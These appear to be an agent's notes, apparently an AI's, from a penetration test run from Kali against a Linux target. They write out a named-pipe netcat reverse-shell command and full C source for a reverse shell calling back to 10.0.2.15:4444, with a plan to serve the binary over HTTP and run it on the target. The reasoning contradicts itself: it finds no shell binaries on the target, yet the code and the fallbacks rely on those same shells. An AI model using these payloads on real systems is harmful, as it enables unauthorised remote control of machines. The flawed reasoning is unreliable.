Netcat on the target does not support the -e option, so I cannot directly spawn a shell through -e flag.

I will try other netscat options or use a named pipe technique for reverse shell:

mkfifo /tmp/f; /usr/bin/nc 10.0.2.15 4444 < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f

Given /bin/sh is missing, I will substitute with /bin/dash or /bin/bash if they exist.

From previous checks, /bin/sh /bin/bash /bin/dash not found for execution, which blocks typical shell-based reverse shell.

Alternative method: Upload a compiled static reverse shell binary and execute.

I will compile a static reverse shell C program on Kali, serve it via HTTP server, download and run on the target.

Compiling static reverse shell on Kali:

Using this C code for Linux x86_64:

#include <unistd.h>  
#include <sys/socket.h>  
#include <netinet/in.h>  

int main(void) {  
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);  
    struct sockaddr_in serv_addr = {0};  
    serv_addr.sin_family = AF_INET;  
    serv_addr.sin_port = htons(4444);  
    serv_addr.sin_addr.s_addr = inet_addr("10.0.2.15");  
    connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr));  
    dup2(sockfd, 0);  
    dup2(sockfd, 1);  
    dup2(sockfd, 2);  
    execl("/bin/sh", "sh", NULL);  
    return 0;  
}

Since /bin/sh missing, I will modify execl to /bin/bash or /bin/dash if available.

Alternatively, I can use execve with "/bin/dash".

I will compile this as "revshell" static binary on Kali and proceed.

Then serve it via HTTP, download to /tmp/revshell on target, chmod +x, and execute.

I will move to Kali now to compile the reverse shell program.

